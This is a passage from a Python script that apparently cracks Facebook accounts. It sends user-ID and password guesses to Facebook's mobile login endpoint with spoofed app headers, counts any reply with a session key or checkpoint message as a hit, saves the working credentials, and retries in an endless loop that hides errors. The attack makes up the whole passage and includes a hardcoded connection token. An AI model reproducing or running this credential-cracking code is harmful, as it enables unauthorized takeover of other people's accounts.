                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                    'X-FB-Server-Cluster': 'True',
                    'X-FB-Client-IP': 'True',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'x-fb-device-group': '5120',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                    'X-Tigon-Is-Retry': 'False',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-FB-SIM-HNI': '29752',
                    'X-FB-Net-HNI': '25227',
                    'Host': 'graph.facebook.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': generate_user_agent()
                }
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                    success_box(uid, pw)
                    oks.append(uid)
                    break
        loop += 1
    except Exception:
        time.sleep(5)

if __name__ == '__main__':
    while True:
        try:
            approval_system()
            password_prompt()
            BNG_71_()
        except Exception as e:
            time.sleep(2)
